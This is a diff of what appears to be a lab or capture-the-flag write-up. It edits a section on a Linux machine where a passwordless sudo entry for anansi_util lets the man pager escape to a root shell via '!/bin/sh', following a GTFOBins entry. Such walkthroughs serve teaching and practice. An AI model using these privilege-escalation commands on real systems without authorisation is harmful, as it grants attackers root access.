@@ -467,9 +467,9 @@ stty raw -echo;fg
 
 <figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
 
-### **Transfer WinPeas**
+### **Transfer LinPeas**
 
-I tried transfering WinPeas but it couldn't run.
+I tried transfering LinPeas but it didn't end up really using anything from the output.
 
 **Kali**
 
@@ -492,6 +492,8 @@ We discovered we can run the command anansi\_util as sudo without a password. gt
 
 **Exploit:** [https://gtfobins.github.io/gtfobins/man/](https://gtfobins.github.io/gtfobins/man/)
 
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
 ```
 sudo -l
 sudo /home/anansi/bin/anansi_util manual
@@ -499,9 +501,9 @@ sudo /home/anansi/bin/anansi_util manual
 
 <figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
-
+We are able to run the commands mentioned on gtfobins and get a root shell.
 
 <pre><code>sudo /home/anansi/bin/anansi_util manual man
 <strong>!/bin/sh
